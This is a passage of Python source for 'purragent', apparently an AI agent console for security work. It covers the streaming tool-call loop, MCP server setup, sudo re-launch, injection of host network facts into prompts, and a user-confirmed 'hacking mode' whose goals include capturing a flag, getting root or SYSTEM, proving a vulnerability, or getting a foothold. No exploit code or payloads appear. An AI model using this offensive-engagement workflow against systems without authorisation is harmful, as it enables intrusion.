    except (EOFError, KeyboardInterrupt):
        pass


def _help_body() -> str:
    grid = Table.grid(padding=(0, 2))
    grid.add_column(style=f"bold {VIOLET}", no_wrap=True)
    grid.add_column(style="dim")
    for cmd, hint in SLASH:
        grid.add_row(cmd, hint)
    return _render_ansi(Group(
        Text("purragent — commands", style="bold white"),
        Text(""),
        grid,
        Text(""),
        Text.from_markup(
            "Type a message and press [bold]Enter[/bold] to ask the attached model.\n"
            "[bold]Ctrl-C[/bold] interrupts a reply · [bold]Ctrl-D[/bold] quits."),
    ))


def print_help() -> None:
    show_view(_help_body())


def elevate() -> None:
    """Re-launch the whole process under sudo (root). Replaces this process, so
    it does not return on success — sudo prompts for the password on the terminal.
    No-op (with a note) if already root."""
    if _is_root():
        console.print("  [green]●[/green] already running as [bold]root[/bold].")
        return
    cmd = ["sudo", sys.executable] + sys.argv
    console.print("  [dim]re-launching as root (sudo)… enter your password if asked[/dim]")
    sys.stdout.flush()
    try:
        os.execvp("sudo", cmd)          # replaces this process
    except Exception as e:
        console.print(f"  [red]upgrade failed:[/red] {e}")


def _skeleton_body(title: str, note: str) -> str:
    """A placeholder overlay for commands that aren't implemented yet."""
    return _render_ansi(Group(
        Text(title, style=f"bold {VIOLET}"),
        Text(""),
        Text(note, style="dim"),
        Text(""),
        Text("Not implemented yet — coming soon.", style="yellow"),
    ))


def _mcp_add(mcp: "mcp_client.MCPManager", base_dir: str, args: list) -> None:
    """Interactive `/mcp add` for a connect-only (URL) MCP server. `args` may
    prefill [name, url]; the token is read hidden and stored via the secret
    store (never in mcp_servers.json). Probes liveness and reports alive/dead."""
    name = args[0] if len(args) > 0 else ""
    url = args[1] if len(args) > 1 else ""
    try:
        if not name:
            name = input("  name: ").strip()
        # Reject a duplicate name up front — before asking for the url/token — so
        # the user isn't led through the whole flow only to be turned away, and a
        # built-in (e.g. purrtools) can't be overwritten.
        if name and name in (mcp.load_config().get("servers") or {}):
            console.print(f"  [yellow]a server named [bold]{name}[/bold] already "
                          "exists.[/yellow]  [dim]/mcp remove it first, or pick "
                          "another name[/dim]")
            return
        if not url:
            url = input("  url (e.g. http://127.0.0.1:9876/sse): ").strip()
    except (EOFError, KeyboardInterrupt):
        console.print("\n  [dim]cancelled[/dim]")
        return
    if not name or not url:
        console.print("  [yellow]name and url are required.[/yellow]  "
                      "[dim]usage: /mcp add <name> <url>[/dim]")
        return
    if not (url.startswith("http://") or url.startswith("https://")):
        console.print("  [yellow]url must start with http:// or https://[/yellow]  "
                      "[dim](connect-only — start the server yourself first)[/dim]")
        return
    try:
        token = getpass.getpass("  token (press enter to skip): ").strip()
    except (EOFError, KeyboardInterrupt):
        token = ""
    console.print("  [dim]probing…[/dim]")
    ok, info = mcp.add_server(name, url, token)
    mcp.connect()                      # refresh so /mcp reflects the new server
    if ok:
        console.print(f"  [green]●[/green] [bold]{name}[/bold] [green]alive[/green] "
                      f"— [dim]{info}[/dim]")
    else:
        console.print(f"  [red]○[/red] [bold]{name}[/bold] [red]dead[/red] — "
                      f"[dim]{info}[/dim]")
    console.print(f"  [dim]added as[/dim] [yellow]disabled[/yellow] "
                  "[dim]— enable it to use its tools[/dim]")


def _mcp_body(rows: list, tools_ok: bool) -> str:
    """Overlay listing every configured MCP server with a uniform status line:
    connecting (cyan) / alive (green) / dead (red) / disabled, its version, and
    its enabled state. Connected stdio servers also list their tools. `rows`
    comes from MCPManager.overview(); a row may carry a `connecting` countdown
    (seconds left) while its background liveness probe is still in flight."""
    parts = [Text("purragent — MCP servers", style=f"bold {VIOLET}"), Text("")]
    if not rows:
        parts.append(Text("No MCP servers configured.", style="dim"))
        parts.append(Text(""))
        parts.append(Text.from_markup(
            "Declare servers in [bold]appdata/mcp_servers.json[/bold]."))
        return _render_ansi(Group(*parts))

    for r in rows:
        name = r["name"]
        head = Text()
        if r.get("connecting") is not None:
            # Background probe still running — show a live countdown, not a verdict.
            head.append("◍ ", style="cyan")
            head.append(name, style="bold white")
            head.append(f"   connecting… {r['connecting']}s", style="cyan")
        elif not r["probed"]:
            # A disabled stdio server, never spawned — no alive/dead to show.
            head.append("○ ", style="bright_black")
            head.append(name, style="bold white")
            head.append("   disabled", style="yellow")
            parts.append(head)
            parts.append(Text(""))
            continue
        elif r["alive"]:
            head.append("● ", style="green")
            head.append(name, style="bold white")
            head.append("   alive", style="bold green")
            if r["detail"]:
                head.append(f" · {r['detail']}", style="dim")
        else:
            head.append("○ ", style="red")
            head.append(name, style="bold white")
            head.append("   dead", style="bold red")
            if r["detail"]:
                head.append(f" — {r['detail']}", style="red")

        # Shared trailer: enabled/disabled tag, URL (HTTP), and tool list.
        tag, tag_style = ("enabled", "dim") if r["enabled"] else ("disabled", "yellow")
        head.append(f"   ·   {tag}", style=tag_style)
        parts.append(head)
        if r["is_http"] and r["url"]:
            parts.append(Text(f"    {r['url']}", style="dim"))
        if r["tools"]:
            grid = Table.grid(padding=(0, 2))
            grid.add_column(style=f"bold {VIOLET}", no_wrap=True)
            for t in r["tools"]:
                grid.add_row("  " + t.get("name", "?"),
                             Text(t.get("description", ""), style="dim"))
            parts.append(grid)
        parts.append(Text(""))

    # Only warn when the attached model can't use tools; no note otherwise.
    if not tools_ok:
        parts.append(Text(
            "The attached model has no function calling — tools won't be used "
            "until you pick one that does (/model).", style="yellow"))
    return _render_ansi(Group(*parts))


# ── Environment block (host facts injected into every prompt) ──────────────────
# Mirrors Claude Code's <env> block: give the model basic host facts up front so
# it doesn't burn tool calls discovering the user, home, OS, cwd, etc. Static
# facts come from stdlib only (no subprocess). Local network interfaces ARE
# included on purpose — a security agent benefits from knowing its own position
# (which subnet it's on, the default route) to scope work against authorised
# targets. We still make NO outbound calls (no public-IP lookup).

@functools.lru_cache(maxsize=1)
def _env_facts() -> str:
    """Static host facts, computed once per process (re-exec by /upgrade refreshes)."""
    try:
        user = getpass.getuser()
    except Exception:
        user = os.environ.get("USER", "?")
    try:
        uid = os.geteuid()
        uid_s = f"uid {uid}, {'root' if uid == 0 else 'non-root'}"
    except AttributeError:              # non-POSIX
        uid_s = "non-POSIX"

    distro = ""
    try:
        with open("/etc/os-release", encoding="utf-8") as f:
            for line in f:
                if line.startswith("PRETTY_NAME="):
                    distro = line.split("=", 1)[1].strip().strip('"')
                    break
    except Exception:
        pass
    kernel = f"{platform.system()} {platform.release()} {platform.machine()}".strip()
    os_line = f"{distro} · {kernel}" if distro else kernel

    return "\n".join([
        f"user: {user} ({uid_s})",
        f"host: {platform.node() or '?'}",
        f"home: {os.path.expanduser('~')}",
        f"os: {os_line}",
        f"shell: {os.environ.get('SHELL', '?')}",
    ])


def _netmask_to_cidr(mask: str) -> int:
    """Dotted-quad netmask → prefix length (255.255.255.0 → 24)."""
    try:
        return sum(bin(int(o)).count("1") for o in mask.split("."))
    except Exception:
        return 0


def _default_route() -> tuple:
    """(iface, gateway_ip) for the IPv4 default route on Linux via /proc/net/route,
    or ('', '') if it can't be read."""
    try:
        with open("/proc/net/route", encoding="utf-8") as f:
            next(f)                                    # skip the header row
            for line in f:
                cols = line.split()
                if len(cols) >= 3 and cols[1] == "00000000":   # destination 0.0.0.0
                    gw = ".".join(str(int(cols[2][i:i + 2], 16))
                                  for i in (6, 4, 2, 0))        # little-endian hex
                    return cols[0], gw
    except Exception:
        pass
    return "", ""


def _net_facts() -> str:
    """Live network view: each up, non-loopback interface's IPv4 as address/CIDR,
    the default-route interface marked, plus the default gateway. Best-effort via
    psutil; returns '' if unavailable so the <env> block simply omits it."""
    try:
        import socket
        import psutil
    except Exception:
        return ""
    try:
        addrs = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
    except Exception:
        return ""
    default_if, gateway = _default_route()
    lines = []
    for name in sorted(addrs):
        if name == "lo":
            continue
        st = stats.get(name)
        if st is not None and not st.isup:             # skip down interfaces
            continue
        for a in addrs[name]:
            if (a.family == socket.AF_INET and a.address
                    and not a.address.startswith("127.")):
                cidr = _netmask_to_cidr(a.netmask or "")
                ip = f"{a.address}/{cidr}" if cidr else a.address
                mark = "  (default)" if name == default_if else ""
                lines.append(f"  {name}: {ip}{mark}")
                break                                  # one IPv4 per interface is enough
    if not lines:
        return ""
    out = ["network:"] + lines
    if gateway:
        out.append(f"  gateway: {gateway}")
    return "\n".join(out)


def _env_block() -> str:
    """The <env> block for the system prompt: cached static facts, a live cwd/date
    (so long sessions don't show a stale date), and the live network view (VPNs /
    DHCP leases can change mid-session, so it's recomputed each prompt)."""
    from datetime import date
    parts = ["<env>", _env_facts(),
             f"cwd: {os.getcwd()}", f"date: {date.today().isoformat()}"]
    net = _net_facts()
    if net:
        parts.append(net)
    parts.append("</env>")
    return "\n".join(parts)


# ── LLM query (reuses psai) ────────────────────────────────────────────────────

# purragent pins a low sampling temperature for EVERY model, ignoring whatever a
# profile is configured with. Tool selection and argument-filling are precise,
# single-right-answer tasks, so we favour consistency over variance — this cut the
# stray, self-corrected tool calls we saw in testing.
AGENT_TEMPERATURE = 0.2
# Wall-clock caps for automated (non-interactive) LLM turns, so a model stuck
# streaming reasoning forever can't hang the recon pipeline. Interactive chat stays
# uncapped (long answers are legitimate there).
EXTRACT_TURN_MAX_SECONDS = 90.0    # phase-5 per-command finding extraction
AGENT_TURN_MAX_SECONDS = 180.0     # phase-4.5 review + phase-5 exploit agent turns


def query_model(profile: dict, base_dir: str, history: list) -> str:
    provider = profile.get("provider", "ollama")
    model    = profile.get("model", "")
    url      = profile.get("url", "") or psai._DEFAULT_URLS.get(provider, "")
    api_key  = psai._load_api_key(profile.get("name", ""), base_dir)

    custom_params    = psai._parse_custom_params(profile)
    custom_system    = profile.get("custom_system", "").strip()
    disable_thinking = bool(profile.get("disable_thinking", False)) and not custom_params
    hide_thinking    = bool(profile.get("hide_thinking", False))
    temperature      = AGENT_TEMPERATURE   # pinned; not inherited from the profile

    sys_parts = [PURRAGENT_SYSTEM, _env_block()]
    if custom_system:
        sys_parts.append(custom_system)
    msgs = [{"role": "system", "content": "\n\n".join(sys_parts)}] + history

    return psai._run_llm(provider, model, msgs, url, api_key,
                         disable_thinking, custom_params, hide_thinking, temperature)


# ── Agentic tool-use loop (OpenAI-compatible + MCP tools) ──────────────────────
# When MCP tools are available and the model supports function calling, we run a
# small agent loop instead of the plain streaming chat: pass every server's tool
# schemas to the model, execute whatever it calls (via the MCP client), feed the
# results back, and repeat until it answers in plain text. Each round is streamed
# (SSE) — content deltas are printed live via on_text while tool_call deltas are
# accumulated — so the answer appears token by token, like the plain chat path.
#
# Anthropic and Ollama-native use a different tool wire format; for now the loop
# covers the OpenAI-compatible providers (openrouter/openai/groq/gemini/hf/…),
# which is every provider psai routes through /chat/completions. Others fall back
# to the plain text path (query_model) with no tools.

TOOL_LOOP_MAX_ROUNDS = 8
_THINK_SPINNER = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"   # same braille frames pschat uses


def _supports_tool_loop(profile: dict) -> bool:
    """The tool loop only speaks the OpenAI /chat/completions tool format."""
    return profile.get("provider", "") not in ("anthropic",)


def _openai_endpoint(profile: dict, base_dir: str):
    """(endpoint, api_key) for the profile's OpenAI-compatible chat endpoint."""
    provider = profile.get("provider", "ollama")
    url = profile.get("url", "") or psai._DEFAULT_URLS.get(provider, "")
    if provider == "ollama":                     # native URL lacks the /v1 suffix
        base = url.rstrip("/")
        url = base if base.endswith("/v1") else base + "/v1"
    endpoint = url.rstrip("/") + "/chat/completions"
    api_key = psai._load_api_key(profile.get("name", ""), base_dir)
    return endpoint, api_key


def _chat_stream(endpoint: str, api_key: str, body: dict, on_text,
                 hide_thinking: bool = False, render_reasoning: bool = True,
                 max_seconds: float | None = None) -> dict:
    """Stream one /chat/completions turn (SSE). Prints content deltas live via
    on_text(piece); accumulates tool_call deltas. Reasoning deltas drive a
    'thinking…' spinner when hide_thinking is set, or print greyed inline when
    not. Returns an assistant message dict {content, tool_calls}.
    `render_reasoning=False` suppresses ALL direct terminal writes for reasoning —
    needed when the caller renders on its own screen (e.g. the btw stream view).
    `max_seconds` caps the whole turn on the wall clock: the per-read socket timeout
    can't stop a model stuck streaming reasoning forever (each token resets it), so
    automated/background calls pass a cap to abort a runaway turn."""
    body = dict(body)
    body["stream"] = True
    headers = {
        "Content-Type":  "application/json",
        "Authorization": f"Bearer {api_key}",
        "User-Agent":    "Mozilla/5.0",
    }
    req = urllib.request.Request(
        endpoint, data=json.dumps(body).encode(), headers=headers, method="POST")
    # Under /debug this prints the exact on-the-wire request (masked key, full
    # body incl. the tool schemas) — same dump psai uses for the text path.
    psai._debug_dump_request("openai-compat (agent)", endpoint, "POST", headers, body)

    content_parts: list = []
    tool_calls: dict = {}      # index -> {id, name, args}
    thinking = {"on": False, "spin": 0}

    def _end_thinking():
        """Clear the spinner / close the greyed reasoning block once real output
        (content or a tool call) starts."""
        if not thinking["on"]:
            return
        if not render_reasoning:
            thinking["on"] = False
            return
        if hide_thinking:
            sys.stderr.write("\r" + " " * 44 + "\r")
            sys.stderr.flush()
        else:
            sys.stdout.write("\033[0m\n")
            sys.stdout.flush()
        thinking["on"] = False

    try:
        resp = urllib.request.urlopen(req, timeout=120)
    except urllib.error.HTTPError as e:
        detail = e.read().decode("utf-8", errors="replace")
        on_text(f"[tool loop] HTTP {e.code}: {detail[:400]}")
        return {"role": "assistant", "content": f"[tool loop] HTTP {e.code}"}

    stream_start = time.time()
    with resp:
        for raw in resp:                       # SSE: one "data: {json}" per line
            if max_seconds and (time.time() - stream_start) > max_seconds:
                # Runaway turn (e.g. an endless reasoning loop) — abort and keep
                # whatever was streamed so far; closing `resp` drops the connection.
                break
            line = raw.decode("utf-8", errors="replace").strip()
            if not line or not line.startswith("data:"):
                continue
            data = line[5:].strip()
            if data == "[DONE]":
                break
            try:
                chunk = json.loads(data)
            except json.JSONDecodeError:
                continue
            choices = chunk.get("choices") or []
            if not choices:
                continue
            delta = choices[0].get("delta") or {}

            # Reasoning / chain-of-thought: providers name it differently.
            reasoning = delta.get("reasoning") or delta.get("reasoning_content")
            if reasoning and render_reasoning:
                if hide_thinking:
                    thinking["spin"] += 1
                    frame = _THINK_SPINNER[thinking["spin"] % len(_THINK_SPINNER)]
                    sys.stderr.write(f"\r\033[90mthinking… {frame}\033[0m")
                    sys.stderr.flush()
                else:
                    if not thinking["on"]:
                        sys.stdout.write("\033[90m")   # grey the visible thinking
                    sys.stdout.write(reasoning)
                    sys.stdout.flush()
                thinking["on"] = True

            piece = delta.get("content")
            if piece:
                _end_thinking()
                content_parts.append(piece)
                on_text(piece)

            deltas = delta.get("tool_calls") or []
            if deltas:
                _end_thinking()
            for tc in deltas:
                slot = tool_calls.setdefault(tc.get("index", 0),
                                             {"id": None, "name": "", "args": ""})
                if tc.get("id"):
                    slot["id"] = tc["id"]
                fn = tc.get("function") or {}
                if fn.get("name"):
                    slot["name"] = fn["name"]
                if fn.get("arguments"):
                    slot["args"] += fn["arguments"]

    _end_thinking()   # in case the stream ended still in the thinking phase
    msg = {"role": "assistant", "content": "".join(content_parts) or None}
    if tool_calls:
        msg["tool_calls"] = [
            {"id": s["id"], "type": "function",
             "function": {"name": s["name"], "arguments": s["args"]}}
            for _i, s in sorted(tool_calls.items())
        ]
    return msg


def _tool_arg_preview(args: dict) -> str:
    """A short single-line preview of a tool call's main argument (the command,
    path, url, …) — shown after the tool name on the concise activity line."""
    if not isinstance(args, dict) or not args:
        return ""
    # pattern before path so grep previews the regex, not its search dir
    for key in ("command", "url", "pattern", "path", "query"):
        val = args.get(key)
        if val:
            return " ".join(str(val).split())
    return " ".join(str(next(iter(args.values()))).split())


def _tool_status(result: dict) -> tuple:
    """Reliable (no-heuristic) status for a finished tool call → (glyph, style,
    label). Uses only the call-level error flag and run_command's structured
    'exit code:' line; anything else degrades to a plain ok/failed."""
    text = (result.get("text") or "").strip()
    first = text.split("\n", 1)[0].strip()
    if first.startswith("exit code:"):
        rest = first[len("exit code:"):].strip()
        if rest.startswith("(timeout"):
            return "⏱", "yellow", "timed out"
        if rest == "0":
            return "✓", "green", "ok"
        return "✗", "red", f"exit {rest}"
    if result.get("is_error"):
        return "✗", "red", "failed"
    return "✓", "green", "ok"


class _ToolSpinner:
    """A background braille spinner shown while a blocking tool call / HTTP
    response is awaited, so the user sees progress between the 'running tool'
    line and its result. Animates one line on stderr; stop() clears it and joins
    the thread so the following status line never races the spinner."""

    def __init__(self, label: str = "waiting for result"):
        self._label = label
        self._stop = threading.Event()
        self._thread = None

    def start(self) -> "_ToolSpinner":
        if sys.stderr.isatty():
            self._thread = threading.Thread(target=self._run, daemon=True)
            self._thread.start()
        return self

    def _run(self) -> None:
        i = 0
        while not self._stop.is_set():
            frame = _THINK_SPINNER[i % len(_THINK_SPINNER)]
            sys.stderr.write(f"\r\033[90m    {frame} {self._label}…\033[0m\x1b[K")
            sys.stderr.flush()
            i += 1
            if self._stop.wait(0.09):
                break
        sys.stderr.write("\r\x1b[K")          # clear the spinner line
        sys.stderr.flush()

    def stop(self) -> None:
        if self._thread is None:
            return
        self._stop.set()
        self._thread.join(timeout=0.5)
        self._thread = None


# ── Semantic tool discovery ────────────────────────────────────────────────────
# Instead of sending every tool's full schema every round, the model sees a short
# CATALOG of capabilities plus one meta-function, `request_tool`. When it wants to
# act it describes the need in natural language; the client's RAG retriever
# (tool_retriever) matches that need against each tool's long description and
# example queries and surfaces the best matches (with full schemas) for the model
# to call. Retrieved tools accumulate for the rest of the turn (so a tool used
# twice isn't rediscovered), and the meta-function is withdrawn after a few
# discovery rounds so a model can't spin forever describing needs.

DISCOVERY_MAX_ROUNDS = 3     # how many times request_tool may be used per turn
RETRIEVE_TOP_N       = 3     # tools surfaced per request_tool call
MAX_ACTIVE_TOOLS     = 12    # cap on accumulated full schemas (context budget)
# Fixed, roughly-constant estimate of the `tools` request field during discovery:
# request_tool's schema (~240 tok) plus RETRIEVE_TOP_N surfaced tool schemas.
# Used by /context; the real size varies with which tools get surfaced.
TOOLS_RESERVATION_TOKENS = 900
# Fixed reservation for memory lookup (RAG recall of older conversation, T4).
MEMORY_LOOKUP_TOKENS = 2000

# ── Context budget: how the model window is apportioned ────────────────────────
# We never fill the whole window. Two reasons: quality degrades as a model nears
# its native limit ("lost in the middle" — worse the smaller the model), and the
# model needs room to generate its reply. FILL_FRAC is the quality-safe input
# ceiling; OUTPUT_FLOOR guarantees generation room in *absolute* tokens so a tiny
# window doesn't starve the reply. The effective input budget is the smaller of the
# two, so on big windows FILL_FRAC governs and on tiny ones OUTPUT_FLOOR does. The
# quality margin and the output reserve both live inside the unused (1-FILL_FRAC).
FILL_FRAC    = 0.80
OUTPUT_FLOOR = 6000     # tokens always kept free for the model's reply

# The elastic pool = budget − HEADER − memory-lookup reservation. It is apportioned
# between the live conversation and findings. Two distinct mechanics:
#   • cap (soft ceiling): the caps may sum to >100% of the pool on purpose — an
#     empty/under-used section lends its space to a busier one (borrowing).
#   • reservation (floor): space held even when the section is empty, because it
#     gets filled on demand mid-turn (memory lookup; findings once its DB is wired).
# recent conversation is highest priority: it borrows whatever the lower tiers are
# not reserving, and only its overflow (beyond the pool it can reach) is summarised.
SUMMARIZED_CAP_FRAC   = 0.30   # cap on kept summary; older summary is recompressed
FINDINGS_CAP_FRAC     = 0.20   # cap on findings context once the DB is wired
FINDINGS_FLOOR_TOKENS = 0      # reservation held for findings — 0 until DB attached

META_TOOL_NAME = "request_tool"
_META_TOOL = {
    "type": "function",
    "function": {
        "name": META_TOOL_NAME,
        "description": (
            "Request a tool by describing, in natural language, what you need to "
            "do. The matching tools (with their full parameters) will then be "
            "provided so you can call them. Use this whenever you need to act on "
            "the system — do not guess tool names. Describe the CAPABILITY only, "
            "in a few words; never put the actual data (file contents, target "
            "names, payloads, arguments) in the request — that dilutes the match. "
            "Save the data for when you call the real tool."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "need": {
                    "type": "string",
                    "description": (
                        "A short capability phrase describing the action you "
                        "need, NOT the data it will operate on. Good: 'write text "
                        "to a file', 'scan a host for open ports', 'read a "
                        "configuration file'. Bad: 'create cats.txt with the "
                        "content \"...\"' — leave the filename/content/payload out "
                        "and provide them later as the tool's arguments."
                    ),
                },
            },
            "required": ["need"],
        },
    },
}

ENABLE_HACK_TOOL_NAME = "enable_hacking_mode"
_ENABLE_HACK_TOOL = {
    "type": "function",
    "function": {
        "name": ENABLE_HACK_TOOL_NAME,
        "description": (
            "Switch the console into hacking mode when the user clearly wants to "
            "start an authorised offensive engagement against a specific target "
            "(attack it, pentest it, a CTF / Hack The Box box). Set enable=true to "
            "propose it — the user is still asked to confirm. Do NOT put target "
            "details here; they are collected after confirmation. Do not call this "
            "for general security questions or explanations."),
        "parameters": {
            "type": "object",
            "properties": {
                "enable": {
                    "type": "boolean",
                    "description": ("true to turn hacking mode on (the user then "
                                    "confirms); false does nothing."),
                },
            },
            "required": ["enable"],
        },
    },
}

_HACK_TRIGGER_GUIDE = (
    "HACKING MODE: if the user clearly wants to start an offensive engagement "
    "against a specific target (attack it, pentest it, a CTF/HTB box), call "
    "enable_hacking_mode with enable=true instead of guessing tools — the user "
    "then confirms. Don't call it for general security questions or explanations."
)

SAVE_MEMORY_TOOL_NAME = "save_memory"
_SAVE_MEMORY_TOOL = {
    "type": "function",
    "function": {
        "name": SAVE_MEMORY_TOOL_NAME,
        "description": (
            "Manage what you remember across this conversation and future sessions, when "
            "the USER explicitly asks. action='save' persists a standing INSTRUCTION (how "
            "to behave, something to always do/add) or a FACT to keep; action='delete' "
            "forgets a previously stored memory (match it by the text shown in the "
            "REMEMBERED / USER INSTRUCTIONS block). Only call this when the user clearly "
            "asks to remember/save/note something, to always do something, or to forget/"
            "stop remembering something — never for a normal answer. Store the distilled "
            "point, not the whole message."),
        "parameters": {
            "type": "object",
            "properties": {
                "action": {"type": "string", "enum": ["save", "delete"],
                           "description": "'save' (default) to remember, 'delete' to "
                                          "forget a stored memory."},
                "text": {"type": "string",
                         "description": "For save: the distilled thing to remember, one "
                                        "line. For delete: the stored memory to forget "
                                        "(its exact text or a distinctive part of it)."},
                "kind": {"type": "string", "enum": ["instruction", "fact"],
                         "description": ("(save only) 'instruction' = a standing rule to "
                                         "always follow (e.g. always add X to answers); "
                                         "'fact' = a piece of information to keep.")},
            },
            "required": ["text"],
        },
    },
}

# save_memory is offered on every normal turn (it's one small tool). A keyword gate was
# too brittle — it missed common standing-instruction phrasings ("za każdym razem",
# "każdorazowo", "each response"), so the model never got the tool and silently failed to
# remember. Always offering it and letting the model decide is the reliable choice.
_MEMORY_GUIDE = (
    "MEMORY: when the user gives a STANDING instruction (do X every time / always / from "
    "now on / at the end of each answer / za każdym razem / każdorazowo) or asks you to "
    "remember or forget something, call save_memory ONCE to persist it — a single call, "
    "then stop (do not save it again, delete it, or re-save). The stored USER "
    "INSTRUCTIONS above already apply on every turn, so just keep following them.")

_DISCOVERY_GUIDE = (
    "TOOLS: you can act on the system through tools. The catalog below has two "
    "sections. The 'built-in' tools are listed with their exact name and "
    "parameters (required bare, optional in [brackets]) — call these DIRECTLY by "
    "that exact name with those arguments; do not use request_tool for them. For "
    "the 'others' section, only capabilities are shown, not names: call the "
    "`request_tool` function with a natural-language description of what you "
    "need, and the matching tools will be given to you with their parameters so "
    "you can call them. If a tool you were already given fits, call it directly — "
    "only call `request_tool` again if none fit. If the task needs no tool, just "
    "answer normally."
)


_TOOL_AVAIL_CACHE: dict = {}      # binary -> installed?, per session


def _tool_available(t: dict) -> bool:
    """True if the tool can actually run on this host — native/built-in (no program
    needed), or its required program is on PATH and its python libs are present. Used to
    keep uninstallable tools OUT of what the model is offered, so it never wastes an
    LLM call on a tool that can only return '[not installed]'. (Hack mode's deterministic
    phase-5 walk still prints [skipped] for missing tools so the user sees them.)"""
    if t.get("py_missing"):
        return False
    binary = t.get("requires")
    if not binary:
        return True
    ok = _TOOL_AVAIL_CACHE.get(binary)
    if ok is None:
        ok = bool(shutil.which(binary))
        _TOOL_AVAIL_CACHE[binary] = ok
    return ok


def _catalog_signature(tool: dict) -> str:
    """`write_file(path, content, [append])` — the tool's bare name plus its
    parameter list, required params bare and optional ones in [brackets], read
    from the OpenAI schema. Used only for built-ins, which the model calls
    directly by name (so it needs the argument names up front)."""
    bare = mcp_client.split_namespaced(tool["name"])[1]
    params = (tool.get("schema", {}).get("function", {})
              .get("parameters", {}) or {})
    props = list((params.get("properties") or {}).keys())
    required = set(params.get("required") or [])
    rendered = ", ".join(p if p in required else f"[{p}]" for p in props)
    return f"{bare}({rendered})"


def _catalog_block(all_tools: list) -> str:
    """The always-visible capability catalog, split into two sections:

    - built-in: `name(params) — description`, so the model can call these
      directly by their exact name (they never pass through request_tool);
    - others: `- description` only, reached via request_tool, which surfaces
      their full schema on demand.

    Only names + one-line descriptions are sent here — never full schemas — so
    the context stays small even though the model can act on any tool."""
    builtin = [t for t in all_tools if t.get("builtin")]
    others = [t for t in all_tools if not t.get("builtin")]
    blocks = []
    if builtin:
        rows = "\n".join(f"- {_catalog_signature(t)} — {t['short']}"
                         for t in builtin)
        blocks.append("built-in (call these directly by their exact name):\n"
                      + rows)
    if others:
        rows = "\n".join(f"- {t['short']}" for t in others)
        blocks.append("others (call request_tool to obtain one of these):\n"
                      + rows)
    return "<tool_catalog>\n" + "\n\n".join(blocks) + "\n</tool_catalog>"


def _resolve_tool_name(name: str, all_tools: list):
    """Map a loose/fabricated tool reference to a real namespaced tool name, or
    None. Matches (case-insensitively) the exact namespaced name, the bare tool
    name, or the tool's short catalog description — covering models that ignore
    request_tool and call a tool by its description or without the namespace."""
    if not name:
        return None
    key = name.strip().lower().rstrip(".")
    for t in all_tools:
        full = t["name"]
        bare = mcp_client.split_namespaced(full)[1]
        short = (t.get("short") or "").strip().lower().rstrip(".")
        if key in (full.lower(), bare.lower(), short):
            return full
    return None


_TOOL_RETRIEVER = None


def _get_retriever(base_dir: str, all_tools: list):
    """Lazily build/refresh the shared tool retriever. Returns it, or None if
    embeddings are unavailable (caller then falls back to sending all schemas)."""
    global _TOOL_RETRIEVER
    try:
        if _TOOL_RETRIEVER is None:
            _TOOL_RETRIEVER = tool_retriever.ToolRetriever(base_dir)
        if _TOOL_RETRIEVER.build(all_tools):
            return _TOOL_RETRIEVER
    except Exception:
        return None
    return None


class _StreamTrimmer:
    """Live-text filter that swallows turns which stream only whitespace — the
    blank lines local models tend to emit right before a tool call. Real content
    still flows through live; whitespace is held back and flushed only just before
    the next visible character, so leading/trailing blank lines never hit the
    screen. Turn boundaries are marked by end_turn() (called on tool-call turns)."""

    def __init__(self, sink):
        self._sink = sink            # the real on_text (writes stdout + records)
        self._pending = ""           # whitespace seen but not yet flushed
        self._seen = False           # any visible char emitted this turn?

    def feed(self, piece: str) -> None:
        out = []
        for ch in piece:
            if ch.isspace():
                self._pending += ch          # hold — might be trailing noise
            else:
                if self._pending:
                    out.append(self._pending)
                    self._pending = ""
                out.append(ch)
                self._seen = True
        if out:
            self._sink("".join(out))

    def end_turn(self) -> None:
        """Close a tool-call turn: drop its trailing whitespace, and if it did
        show narration, terminate that line so the tool events start cleanly."""
        self._pending = ""
        if self._seen:
            self._sink("\n")
        self._seen = False


# ── /hack — enter hacking mode ─────────────────────────────────────────────────
# The announcement is a FIXED message; the model's only job is to translate it into
# whatever language the user has been writing in, as plain conversation. This is
# controllable and reliable: with no prior conversation there is no language to
# match, so we show the English text as-is (no model call), and if translation ever
# fails we fall back to it too — so /hack always prints the announcement.

_HACK_ANNOUNCEMENT = (
    "Hacking mode enabled — it works on a single target at a time."
)

_HACK_TRANSLATE_INSTRUCTIONS = (
    "Translate the message below into the language the user has been writing in "
    "during this conversation. If they were writing in English, or you are not "
    "sure, return it unchanged. Output ONLY the translated message — no preamble, "
    "no quotes, no notes.\n\nMessage:\n" + _HACK_ANNOUNCEMENT
)

# Objective of the engagement, chosen right after enabling hacking mode. Each is
# picked to be objectively checkable by the agent later. Tuple: (menu label, menu
# hint, toolbar shortcode).
_HACK_GOALS = [
    ("Find the flag",          "CTF / HTB — capture a flag string",  "flag"),
    ("Get highest privileges", "root / SYSTEM / Administrator",       "privesc"),
    ("Confirm vulnerability",  "prove a specific vuln (PoC)",         "vuln"),
    ("Get system access",      "initial foothold / command exec",     "access"),
]


def _select_hack_goal():
    """Arrow-key menu of the engagement objective. Returns the chosen goal tuple
    (label, hint, shortcode), or None if cancelled (Esc)."""
    opts = [(label, hint) for label, hint, _code in _HACK_GOALS]
    idx = select_option("What is the objective?", opts)
    return None if idx is None else _HACK_GOALS[idx]


def _hack_intro_message(profile: dict, base_dir: str, history: list,
                        mcp, debug: bool) -> str:
    """The hacking-mode announcement in the user's language. The text is fixed
    (_HACK_ANNOUNCEMENT); the model only translates it to whatever language the
    conversation has been in. No prior conversation → return the English text as-is
    (no model call). Any failure → English fallback, so /hack always shows it."""
    # Nothing said yet → no language to match; skip the model entirely.
    if not any(isinstance(m.get("content"), str) and m["content"].strip()
               for m in history):
        return _HACK_ANNOUNCEMENT

    endpoint, api_key = _openai_endpoint(profile, base_dir)
    model         = profile.get("model", "")
    custom_params = psai._parse_custom_params(profile)
    custom_system = profile.get("custom_system", "").strip()
    hide_thinking = bool(profile.get("hide_thinking", False))

    # The instruction goes in a final USER turn (the prior chat ends on an assistant
    # turn; generating with no trailing user turn yields empty output on qwen3). The
    # `/no_think` switch keeps reasoning models from spending the whole reply on
    # thinking (other models ignore it).
    sys_parts = [PURRAGENT_SYSTEM, _env_block()]
    if custom_system:
        sys_parts.append(custom_system)
    messages = ([{"role": "system", "content": "\n\n".join(sys_parts)}]
                + list(history)
                + [{"role": "user",
                    "content": _HACK_TRANSLATE_INSTRUCTIONS + "\n\n/no_think"}])
    body = {"model": model, "messages": messages, "temperature": AGENT_TEMPERATURE}
    if custom_params:
